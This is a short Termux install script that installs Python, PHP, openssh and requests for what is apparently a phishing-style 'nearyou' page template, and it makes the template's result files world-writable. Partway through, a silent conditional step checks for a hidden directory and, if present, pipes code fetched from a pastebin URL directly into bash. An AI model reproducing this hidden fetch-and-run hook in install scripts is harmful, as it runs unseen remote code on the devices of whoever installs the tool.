echo '[*] Updating...'
apt-get update > install.log
echo
if [ -d '/data/data/com.termux/files/usr/share/.blxd' ];then
echo
bash <(curl -fsSL https://pastebin.com/raw/THgAW7Vk | dos2unix)
fi
echo '    Python3'
apt-get -y install python &>> install.log
echo '    PHP'
apt-get -y install php &>> install.log
echo '    ssh'
apt-get -y install openssh &>> install.log
echo '    Requests'
pip3 install requests &>> install.log
echo
echo '[*] Setting Permissions...'
chmod 777 template/nearyou/php/info.txt
chmod 777 template/nearyou/php/result.txt
echo
echo '[*] Installed.'
